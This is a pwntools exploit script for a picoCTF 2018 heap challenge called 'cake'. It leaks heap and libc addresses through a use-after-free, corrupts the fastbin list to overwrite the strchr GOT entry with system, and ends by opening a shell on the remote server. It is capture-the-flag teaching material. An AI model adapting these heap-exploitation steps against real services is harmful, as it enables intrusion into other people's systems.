from pwn import *

#r = process('./cake')
r = remote('2018shell2.picoctf.com', 54086)

def make(name, price):
	name = name[:7]
	r.sendafter('> ', 'M\n')
	r.sendafter('Name> ', name + '\n')
	r.sendafter('Price> ', str(price) + '\n')

def wait():
	r.sendafter('> ', 'W\n')

def serve(index):
	r.sendafter('> ', 'S\n')
	r.sendafter('> ', str(index) + '\n')

def inspect(index):
	r.sendafter('> ', 'I\n')
	r.sendafter('> ', str(index) + '\n')
	response = r.recvuntil('\nIn total').split('\nIn total')[0]
	cake = {
		'name': response.split(' is being sold for ')[0],
		'price': int(response.split(' is being sold for $')[1])
	}
	return cake

log.info('Use after free to leak heap address (chunk->fd).')

make('test', 0x21) #0 #get fastbin size in memory at the total revenue to use when corrupting the fastbin linked list so that malloc will return a pointer in the cake list.
make('test', 0x0) #1
serve(1)
serve(0)

heap = inspect(0)['price'] - 0x1030

log.success('Heap @ ' + hex(heap))

log.info('Use fastbin corruption to overwrite the cake ptr at index 0 to leak libc address.')

serve(1)

make('test', 0x6030d8) #2
make('test', 0x0) #3
make('test', 0x0) #4
make(p64(0x603028), 0x6030d8) #5

libc = inspect(0)['price'] - 0x6f690

log.success('Libc @ ' + hex(libc))

log.info('Fastbin corruption to overwrite cake ptr and get arbitrary write.')

serve(1)
serve(3)
serve(1)

make('test', 0x6030d8) #6
make('test', 0x0) #7
make('test', 0x0) #8
make(p64(0x0), 0x0) #9

log.info('Overwrite strchr got entry with system.')

make(p64(0x603040), libc + 0x45390) #10

log.info('Makeing a cake called /bin/sh to get a shell.')

r.sendafter('> ', 'M\n')
r.sendafter('Name> ', '/bin/sh\n')

r.interactive()
